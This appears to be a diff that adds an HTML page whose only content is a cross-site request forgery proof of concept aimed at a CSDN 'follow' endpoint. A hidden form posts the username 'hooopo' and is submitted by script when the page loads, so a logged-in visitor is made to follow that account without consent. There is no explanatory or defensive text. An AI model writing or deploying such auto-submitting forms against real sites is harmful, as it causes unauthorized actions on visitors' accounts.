@@ -1,0 +1,12 @@
+<html>
+  <body>
+    <form action="http://my.csdn.net/index.php/my/follow/do_follow" id="follow" method="post">
+      <input type=text name="username" value="hooopo" />
+      <input type=submit name="submit_b" value="submit" />
+    </form>
+    <script>
+      var f = document.getElementById("follow");
+      f.submit();
+    </script>
+  </body>
+</html>
